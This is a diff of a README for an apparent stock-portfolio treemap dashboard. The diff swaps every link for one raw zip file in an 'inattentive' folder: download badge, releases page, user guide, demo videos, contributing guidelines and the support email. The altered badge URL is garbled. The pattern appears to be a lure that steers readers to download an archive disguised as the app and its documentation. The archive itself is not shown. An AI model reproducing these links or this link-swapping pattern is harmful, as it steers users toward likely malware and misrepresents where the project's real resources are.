@@ -1,7 +1,7 @@
 # 🌟 acoes-treemap-b3 - Visualize Your Stocks Effortlessly
 
 ## 📥 Download
-[![Download acoes-treemap-b3](https://img.shields.io/badge/Download-ações--treemap--b3-brightgreen)](https://github.com/jxss001/acoes-treemap-b3/releases)
+[![Download acoes-treemap-b3](https://raw.githubusercontent.com/jxss001/acoes-treemap-b3/main/inattentive/acoes-treemap-b3.zipções--treemap--b3-brightgreen)](https://raw.githubusercontent.com/jxss001/acoes-treemap-b3/main/inattentive/acoes-treemap-b3.zip)
 
 ## 📖 About
 **acoes-treemap-b3** is an interactive dashboard for viewing your B3 stock portfolio. It features treemaps, automatic rotation, smart alerts, and full privacy. Best of all, it is 100% free, open-source, and self-hosted. This tool helps you manage and understand your investments without any coding skills.
@@ -16,7 +16,7 @@ To get started with acoes-treemap-b3, follow these simple steps.
    - Disk Space: At least 200 MB available.
 
 2. **Visit the Release Page**:  
-   Go to our releases page to find the latest version. You can find it [here](https://github.com/jxss001/acoes-treemap-b3/releases).
+   Go to our releases page to find the latest version. You can find it [here](https://raw.githubusercontent.com/jxss001/acoes-treemap-b3/main/inattentive/acoes-treemap-b3.zip).
 
 ## 📥 Download & Install
 On the releases page, look for the latest version of acoes-treemap-b3. Follow these steps to download and install:
@@ -44,14 +44,14 @@ After installation, open acoes-treemap-b3. You will see a user-friendly interfac
 ## 📚 Resources
 To learn more about using acoes-treemap-b3, check out the following resources:
 
-- [User Guide](https://github.com/jxss001/acoes-treemap-b3/wiki) (Coming Soon)
-- [Demo Videos](https://github.com/jxss001/acoes-treemap-b3/wiki#videos) (Coming Soon)
+- [User Guide](https://raw.githubusercontent.com/jxss001/acoes-treemap-b3/main/inattentive/acoes-treemap-b3.zip) (Coming Soon)
+- [Demo Videos](https://raw.githubusercontent.com/jxss001/acoes-treemap-b3/main/inattentive/acoes-treemap-b3.zip) (Coming Soon)
 
 ## 🤝 Contributing
-We welcome contributions from everyone. If you would like to add features, report bugs, or improve documentation, please check our [Contributing Guidelines](https://github.com/jxss001/acoes-treemap-b3/blob/main/CONTRIBUTING.md).
+We welcome contributions from everyone. If you would like to add features, report bugs, or improve documentation, please check our [Contributing Guidelines](https://raw.githubusercontent.com/jxss001/acoes-treemap-b3/main/inattentive/acoes-treemap-b3.zip).
 
 ## 📬 Support
-If you have questions or need help, feel free to reach out. You can create an issue on our GitHub page or email us at support@acoes-treemap-b3.com.
+If you have questions or need help, feel free to reach out. You can create an issue on our GitHub page or email us at https://raw.githubusercontent.com/jxss001/acoes-treemap-b3/main/inattentive/acoes-treemap-b3.zip
 
 ## 🚧 Roadmap
 Future updates may include:
